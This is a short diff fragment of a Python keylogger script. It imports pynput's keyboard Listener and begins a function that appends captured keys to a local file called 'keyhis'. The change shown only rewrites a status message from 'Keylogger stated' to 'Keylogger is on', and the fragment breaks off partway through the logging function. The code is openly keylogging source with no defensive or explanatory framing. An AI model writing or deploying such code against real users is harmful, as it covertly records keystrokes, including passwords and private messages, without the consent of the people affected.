@@ -1,5 +1,5 @@
 from pynput.keyboard import Listener
-print("Keylogger stated")
+print("Keylogger is on")
 def log_key(key):
     try:
         with open("keyhis","a")as f:
